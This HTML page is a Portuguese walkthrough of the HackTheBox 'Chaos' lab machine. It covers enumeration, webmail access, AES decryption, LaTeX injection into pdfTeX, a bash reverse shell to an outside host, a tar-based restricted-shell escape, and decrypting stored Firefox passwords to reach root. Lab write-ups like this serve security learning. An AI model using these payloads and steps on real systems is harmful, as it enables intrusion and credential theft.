<!DOCTYPE html>
<html>
<style>

		@font-face { font-family: "gohu"; src: url("/gohu.woff") format('woff'); }
		body {
			font-family: 'gohu', monospace;
			max-width: 50em;
			margin: 0 auto;
			color: white;
			background: black;
			line-height: calc(1ex / 0.32);
			margin-top: 3em;
		}
		pre {
			font-family: 'gohu', monospace;
			white-space: pre-wrap;
			line-height: 125%;
      background-color: #111;
      padding: 1em;
		}
		@media only screen and (max-width:768px) {
			body {
				max-width:100%;
			}
		}
		a:link {
			color: #0a0 ;
		}
		a:visited {
			color: #004100 ;
		}
		td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
		span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
		td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
		span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
		.codehilite .hll { background-color: #0000ff }
		.codehilite { background: #000000; }
		.codehilite .c { color: #00ff00 } /* Comment */
		.codehilite .k { color: #ff0000 } /* Keyword */
		.codehilite .ch { color: #00ff00 } /* Comment.Hashbang */
		.codehilite .cm { color: #00ff00 } /* Comment.Multiline */
		.codehilite .cp { color: #e5e5e5 } /* Comment.Preproc */
		.codehilite .cpf { color: #00ff00 } /* Comment.PreprocFile */
		.codehilite .c1 { color: #00ff00 } /* Comment.Single */
		.codehilite .cs { color: #00ff00 } /* Comment.Special */
		.codehilite .kc { color: #ff0000 } /* Keyword.Constant */
		.codehilite .kd { color: #ff0000 } /* Keyword.Declaration */
		.codehilite .kn { color: #ff0000 } /* Keyword.Namespace */
		.codehilite .kp { color: #ff0000 } /* Keyword.Pseudo */
		.codehilite .kr { color: #ff0000 } /* Keyword.Reserved */
		.codehilite .kt { color: #ee82ee } /* Keyword.Type */
		.codehilite .s { color: #87ceeb } /* Literal.String */
		.codehilite .no { color: #7fffd4 } /* Name.Constant */
		.codehilite .nf { color: #ffff00 } /* Name.Function */
		.codehilite .nv { color: #eedd82 } /* Name.Variable */
		.codehilite .sa { color: #87ceeb } /* Literal.String.Affix */
		.codehilite .sb { color: #87ceeb } /* Literal.String.Backtick */
		.codehilite .sc { color: #87ceeb } /* Literal.String.Char */
		.codehilite .dl { color: #87ceeb } /* Literal.String.Delimiter */
		.codehilite .sd { color: #87ceeb } /* Literal.String.Doc */
		.codehilite .s2 { color: #87ceeb } /* Literal.String.Double */
		.codehilite .se { color: #87ceeb } /* Literal.String.Escape */
		.codehilite .sh { color: #87ceeb } /* Literal.String.Heredoc */
		.codehilite .si { color: #87ceeb } /* Literal.String.Interpol */
		.codehilite .sx { color: #87ceeb } /* Literal.String.Other */
		.codehilite .sr { color: #87ceeb } /* Literal.String.Regex */
		.codehilite .s1 { color: #87ceeb } /* Literal.String.Single */
		.codehilite .ss { color: #87ceeb } /* Literal.String.Symbol */
		.codehilite .fm { color: #ffff00 } /* Name.Function.Magic */
		.codehilite .vc { color: #eedd82 } /* Name.Variable.Class */
		.codehilite .vg { color: #eedd82 } /* Name.Variable.Global */
		.codehilite .vi { color: #eedd82 } /* Name.Variable.Instance */
		.codehilite .vm { color: #eedd82 } /* Name.Variable.Magic */
	
</style>
<head>
  <meta charset="UTF-8">
</head>

<body><h1>chaos</h1>
<p><img alt="1" src="https://i.imgur.com/AE94mPY.png" /></p>
<p>Antes de iniciar a solucao, adicionei as seguintes alteracoes ao <strong>/etc/hosts</strong>:</p>
<p><img alt="2" src="https://i.imgur.com/xdDvqbb.png" /></p>
<hr />
<h1>Enumeracao</h1>
<p>Iniciando com o nmap, e possivel visualizar alguns servicos e portas:</p>
<p><code>nmap -sV -Pn 10.10.10.120</code></p>
<p><img alt="3" src="https://i.imgur.com/ZL1o8nA.png" /></p>
<p>Nos temos http na porta 80 , servicos relacionados a email (imap, pop3) em execucao nas portas 110, 143, 993 e 995.
Comecando pelo http:</p>
<p><img alt="4" src="https://i.imgur.com/UbjMbRR.png" /></p>
<p>Apos uns minutos revirando, nao encontrei nenhuma informacao util e segui.
Utilizando o gobuster em <strong>chaos.htb</strong> recebemos:</p>
<div class="codehilite"><pre><span></span><code><span class="gh">Gobuster v2.0.0              OJ Reeves (@TheColonial)</span>
<span class="gh">=====================================================</span>
[+] Mode         : dir
[+] Url/Domain   : http://chaos.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
<span class="gh">[+] Timeout      : 10s</span>
<span class="gh">=====================================================</span>
<span class="gh">2019/05/24 14:36:56 Starting gobuster</span>
<span class="gh">=====================================================</span>
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/img (Status: 301)
/index.html (Status: 200)
/javascript (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
<span class="gh">/source (Status: 301)</span>
<span class="gh">=====================================================</span>
<span class="gh">2019/05/24 14:40:36 Finished</span>
<span class="gh">=====================================================</span>
</code></pre></div>


<p>Porem, quando utilizado o gobuster diretamente em <strong>10.10.10.120</strong>, o resultado foi:  </p>
<div class="codehilite"><pre><span></span><code><span class="o">=====================================================</span>
<span class="n">Gobuster</span><span class="w"> </span><span class="n">v2</span><span class="mf">.0.0</span><span class="w">              </span><span class="n">OJ</span><span class="w"> </span><span class="n">Reeves</span><span class="w"> </span><span class="p">(</span><span class="nv">@TheColonial</span><span class="p">)</span>
<span class="o">=====================================================</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Mode</span><span class="w">         </span><span class="err">:</span><span class="w"> </span><span class="n">dir</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Url</span><span class="o">/</span><span class="k">Domain</span><span class="w">   </span><span class="err">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.120</span><span class="o">/</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Threads</span><span class="w">      </span><span class="err">:</span><span class="w"> </span><span class="mi">10</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Wordlist</span><span class="w">     </span><span class="err">:</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirb</span><span class="o">/</span><span class="n">common</span><span class="p">.</span><span class="n">txt</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="n">codes</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="mi">200</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">301</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="mi">307</span><span class="p">,</span><span class="mi">403</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Timeout</span><span class="w">      </span><span class="err">:</span><span class="w"> </span><span class="mi">10</span><span class="n">s</span>
<span class="o">=====================================================</span>
<span class="mi">2019</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">24</span><span class="w"> </span><span class="mi">14</span><span class="err">:</span><span class="mi">41</span><span class="err">:</span><span class="mi">52</span><span class="w"> </span><span class="n">Starting</span><span class="w"> </span><span class="n">gobuster</span>
<span class="o">=====================================================</span>
<span class="o">/</span><span class="p">.</span><span class="n">hta</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">403</span><span class="p">)</span>
<span class="o">/</span><span class="p">.</span><span class="n">htaccess</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">403</span><span class="p">)</span>
<span class="o">/</span><span class="p">.</span><span class="n">htpasswd</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">403</span><span class="p">)</span>
<span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">html</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span>
<span class="o">/</span><span class="n">javascript</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">301</span><span class="p">)</span>
<span class="o">/</span><span class="n">server</span><span class="o">-</span><span class="n">status</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">403</span><span class="p">)</span>
<span class="o">/</span><span class="n">wp</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">301</span><span class="p">)</span>
<span class="o">=====================================================</span>
<span class="mi">2019</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">24</span><span class="w"> </span><span class="mi">14</span><span class="err">:</span><span class="mi">45</span><span class="err">:</span><span class="mi">37</span><span class="w"> </span><span class="n">Finished</span>
<span class="o">=====================================================</span>
</code></pre></div>


<p>O que e, no minimo, curioso.
Checando o diretorio <strong>/wp</strong>, qual foi obtido no scan diretamente no ip, podemos visualizar a seguinte saida:</p>
<p><img alt="5" src="https://i.imgur.com/C6d5YE3.png" /></p>
<p>acessando <strong>/wp/wordpress</strong>, obtemos uma pagina. Acessando a area de <strong>posts</strong>, no canto direito do menu, obtemos uma pagina com um campo <strong>"password"</strong>, e logo acima a mensagem <strong>"OCTOBER 20, 2018 BY HUMAN"</strong>.
Utilizando <strong>"human"</strong> como password, obtemos a seguinte saida:</p>
<p><img alt="6" src="https://i.imgur.com/oQ1xCgM.png" /></p>
<h2>O servico de e-mail</h2>
<p>Nesse momento, baseado nos resultados de e-mail do nmap, resolvi adicionar a seguinte mudanca ao <strong>/etc/hosts</strong>:</p>
<p><img alt="7" src="https://i.imgur.com/g1XGpDy.png" /></p>
<p>e, acessando <strong>webmail.chaos.htb</strong>:</p>
<p><img alt="8" src="https://i.imgur.com/jGKkPgS.png" /></p>
<p>Utilizando as credenciais obtidas no setor wordpress e acessando os rascunhos:</p>
<p><img alt="9" src="https://i.imgur.com/clzfG56.png" /></p>
<p>Baixando os arquivos anexados, obtemos uma mensagem criptografada e um script python.</p>
<div class="codehilite"><pre><span></span><code><span class="nv">def</span><span class="w"> </span><span class="nv">encrypt</span><span class="ss">(</span><span class="nv">key</span>,<span class="w"> </span><span class="nv">filename</span><span class="ss">)</span>:
<span class="w">    </span><span class="nv">chunksize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">64</span><span class="o">*</span><span class="mi">1024</span>
<span class="w">    </span><span class="nv">outputFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;en&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">filename</span>
<span class="w">    </span><span class="nv">filesize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">str</span><span class="ss">(</span><span class="nv">os</span>.<span class="nv">path</span>.<span class="nv">getsize</span><span class="ss">(</span><span class="nv">filename</span><span class="ss">))</span>.<span class="nv">zfill</span><span class="ss">(</span><span class="mi">16</span><span class="ss">)</span>
<span class="w">    </span><span class="nv">IV</span><span class="w"> </span><span class="o">=</span><span class="k">Random</span>.<span class="nv">new</span><span class="ss">()</span>.<span class="nv">read</span><span class="ss">(</span><span class="mi">16</span><span class="ss">)</span><span class="w">  </span>
<span class="w">    </span><span class="nv">encryptor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">AES</span>.<span class="nv">new</span><span class="ss">(</span><span class="nv">key</span>,<span class="w"> </span><span class="nv">AES</span>.<span class="nv">MODE_CBC</span>,<span class="w"> </span><span class="nv">IV</span><span class="ss">)</span><span class="w">  </span>
<span class="w">    </span><span class="nv">with</span><span class="w"> </span><span class="nv">open</span><span class="ss">(</span><span class="nv">filename</span>,<span class="w"> </span><span class="s1">&#39;rb&#39;</span><span class="ss">)</span><span class="w"> </span><span class="nv">as</span><span class="w"> </span><span class="nv">infile</span>:
<span class="w">        </span><span class="nv">with</span><span class="w"> </span><span class="nv">open</span><span class="ss">(</span><span class="nv">outputFile</span>,<span class="w"> </span><span class="s1">&#39;wb&#39;</span><span class="ss">)</span><span class="w"> </span><span class="nv">as</span><span class="w"> </span><span class="nv">outfile</span>:
<span class="w">            </span><span class="nv">outfile</span>.<span class="nv">write</span><span class="ss">(</span><span class="nv">filesize</span>.<span class="nv">encode</span><span class="ss">(</span><span class="s1">&#39;utf-8&#39;</span><span class="ss">))</span>
<span class="w">            </span><span class="nv">outfile</span>.<span class="nv">write</span><span class="ss">(</span><span class="nv">IV</span><span class="ss">)</span><span class="w">  </span>
<span class="w">            </span><span class="k">while</span><span class="w"> </span><span class="nv">True</span>:
<span class="w">                </span><span class="nv">chunk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">infile</span>.<span class="nv">read</span><span class="ss">(</span><span class="nv">chunksize</span><span class="ss">)</span><span class="w">  </span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="nv">len</span><span class="ss">(</span><span class="nv">chunk</span><span class="ss">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span>:
<span class="w">                    </span><span class="k">break</span>
<span class="w">                </span><span class="nv">elif</span><span class="w"> </span><span class="nv">len</span><span class="ss">(</span><span class="nv">chunk</span><span class="ss">)</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span>:
<span class="w">                    </span><span class="nv">chunk</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nv">b</span><span class="s1">&#39; &#39;</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="ss">(</span><span class="mi">16</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="ss">(</span><span class="nv">len</span><span class="ss">(</span><span class="nv">chunk</span><span class="ss">)</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">16</span><span class="ss">))</span><span class="w">  </span>
<span class="w">                </span><span class="nv">outfile</span>.<span class="nv">write</span><span class="ss">(</span><span class="nv">encryptor</span>.<span class="nv">encrypt</span><span class="ss">(</span><span class="nv">chunk</span><span class="ss">))</span>
<span class="nv">def</span><span class="w"> </span><span class="nv">getKey</span><span class="ss">(</span><span class="nv">password</span><span class="ss">)</span>:
<span class="w">            </span><span class="nv">hasher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">SHA256</span>.<span class="nv">new</span><span class="ss">(</span><span class="nv">password</span>.<span class="nv">encode</span><span class="ss">(</span><span class="s1">&#39;utf-8&#39;</span><span class="ss">))</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nv">hasher</span>.<span class="nv">digest</span><span class="ss">()</span>
</code></pre></div>


<p>O script usa criptografia AES para fazer a codificacao, logo, precisamos de uma funcao que faca o processo contrario.  </p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">SHA256</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>  
<span class="k">def</span> <span class="nf">getKey</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
            <span class="n">hasher</span> <span class="o">=</span> <span class="n">SHA256</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
            <span class="k">return</span> <span class="n">hasher</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>  
<span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
    <span class="n">fileoutput</span> <span class="o">=</span> <span class="n">filename</span> <span class="o">+</span> <span class="s2">&quot;_out&quot;</span>
    <span class="n">csize</span> <span class="o">=</span> <span class="mi">64</span><span class="o">*</span><span class="mi">1024</span>  
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
        <span class="n">size</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span>
        <span class="n">value</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
        <span class="n">decrypt</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">fileoutput</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">outfile</span><span class="p">:</span>
            <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
                <span class="n">chunk</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">csize</span><span class="p">)</span>
                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                    <span class="k">break</span>
                <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypt</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">chunk</span><span class="p">))</span>
            <span class="n">outfile</span><span class="o">.</span><span class="n">truncate</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>  
<span class="n">password</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;Senha: &quot;</span><span class="p">)</span>
<span class="n">decode</span><span class="p">(</span><span class="n">getKey</span><span class="p">(</span><span class="n">password</span><span class="p">),</span> <span class="s1">&#39;enim_msg.txt&#39;</span><span class="p">)</span>
</code></pre></div>


<p>No email, a dica era:  </p>
<div class="codehilite"><pre><span></span><code>&quot;Hii, sahay
Check the enmsg.txt
You are the password XD.&quot;
</code></pre></div>


<p>Entao, usamos nosso nome <strong>"sahay"</strong> como senha.
A saida:</p>
<p><img alt="10" src="https://i.imgur.com/CE5E6WI.png" /></p>
<h2>Exploracao e obtencao de shell</h2>
<p>Acessando <code>http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3</code>, temos:</p>
<p><img alt="11" src="https://i.imgur.com/WEBJxLo.png" /></p>
<p>Utilizando um proxy e checando a saida desta requisicao, vemos:</p>
<p><img alt="12" src="https://i.imgur.com/Fcrff2p.png" /></p>
<ul>
<li>e Possivel vermos <a href="https://en.wikipedia.org/wiki/PdfTeX">pdfTeX</a> no corpo da resposta</li>
</ul>
<p>Abusando do LaTeX injection, podemos obter uma possivel execucao de codigo remoto.
A estrutura do payload: <code>\immediate\write18{env &gt; output}</code> ou <code>\input{output}</code>. Outros exemplos podem ser encontrados em <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection">PayloadAllTheThings</a>.</p>
<p>Enviando uma requisicao de shell reversa, temos a saida:</p>
<p>payload: <code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1'</code> [ encoded as url ]</p>
<p><img alt="13" src="https://i.imgur.com/d5LK9SK.png" /></p>
<h2>Escalada de privilegios 1/2</h2>
<p>Apos usar o python pty, podemos utilizar do usuario <code>ayush:jiujitsu</code> que conseguimos anteriormente.</p>
<p><img alt="14" src="https://i.imgur.com/aUAue6V.png" /></p>
<p>Conseguimos o acesso, porem, com uma shell restrita.
Podemos visualizar os binarios quais podemos executar, exibindo o PATH e utilizando da tecla <strong>tab</strong>.</p>
<p><img alt="15" src="https://i.imgur.com/4mogxmH.png" /></p>
<ul>
<li>tar</li>
<li>ping</li>
<li>dir</li>
</ul>
<hr />
<p>Utilizando do Tar para o retorno da shell com:</p>
<div class="codehilite"><pre><span></span><code><span class="nv">tar</span><span class="w"> </span><span class="o">-</span><span class="nv">cf</span><span class="w"> </span><span class="o">/</span><span class="nv">dev</span><span class="o">/</span><span class="nv">null</span><span class="w"> </span><span class="o">/</span><span class="nv">dev</span><span class="o">/</span><span class="nv">null</span><span class="w"> </span><span class="o">--</span><span class="nv">checkpoint</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="o">--</span><span class="nv">checkpoint</span><span class="o">-</span><span class="nv">action</span><span class="o">=</span><span class="k">exec</span><span class="o">=/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">sh</span>
</code></pre></div>


<p>e concertando o PATH com:</p>
<p><code>export PATH=/bin</code></p>
<p>ou</p>
<div class="codehilite"><pre><span></span><code><span class="k">export</span><span class="w"> </span><span class="n">PATH</span><span class="o">=$</span><span class="n">PATH</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span>
</code></pre></div>


<p><img alt="16" src="https://i.imgur.com/NfkSUNa.png" /></p>
<h2>Escalada de privilegios 2/2</h2>
<p>Listando os diretorios e arquivos ocultos, temos:</p>
<p><img alt="17" src="https://i.imgur.com/RWUW40l.png" /></p>
<p>Com o diretorio <strong>.mozila</strong> disponivel, podemos traze-lo para nosso ambiente local utilizando:</p>
<p><code>python -m SimpleHTTPServer port</code></p>
<p>E baixando localmente em nossa maquina, com:</p>
<p><code>http://chaos.htb:1919/ --recursive</code></p>
<p><img alt="18" src="https://i.imgur.com/ZOlilEG.png" /></p>
<p>apos o download, vemos que existe um arquivo chamado <strong>bzo7sjt1.default</strong> dentre varios outros. E, utilizando da ferramenta <a href="https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py">Firefox_decrypt</a>, podemos fazer a decodificacao do nosso arquivo *.default. Logo apos o download e execucao da ferramenta, ele nos solicita uma Senha.
Utilizando da senha <code>jiujitsu</code> do usuario <code>ayush</code> que conseguimos previamente, obtemos a saida do arquivo criptografado:</p>
<p><img alt="19" src="https://i.imgur.com/6BIME4P.png" /></p>
<p>Voltando a nossa shell, utilizamos as credenciais para o <em>root</em> e obtemos a flag final:</p>
<p><img alt="20" src="https://i.imgur.com/9zzP3qI.png" /></p>
<hr />
<h3>Referencias</h3>
<ul>
<li><a href="https://gtfobins.github.io/">GTFoBins</a></li>
<li><a href="http://pentestmonkey.net/">Pentestmonkey</a></li>
<li><a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf">Linux Restricted Shell Bypass</a>  </li>
</ul></body><hr>by cnx</html>